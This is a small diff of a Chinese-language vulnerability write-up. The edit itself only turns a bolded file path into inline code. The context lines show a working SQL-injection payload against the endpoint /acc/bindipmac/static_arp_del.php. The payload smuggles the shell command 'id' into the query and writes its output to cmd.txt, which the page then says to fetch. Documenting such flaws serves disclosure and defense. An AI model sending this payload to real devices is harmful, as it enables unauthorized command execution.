@@ -28,7 +28,7 @@
 /acc/bindipmac/static_arp_del.php?x=1&arpName=1' and 0 union select 1,'||id>cmd.txt||',3,4,5,6,7,8--
 ```
 
-再访问 **/acc/bindipmac/cmd.txt**
+再访问 `/acc/bindipmac/cmd.txt`
 
 ![img](../../../.vuepress/public/img/1635944083151-f56d838d-54e4-4d28-a6ac-6e079e936cf3.png)
 
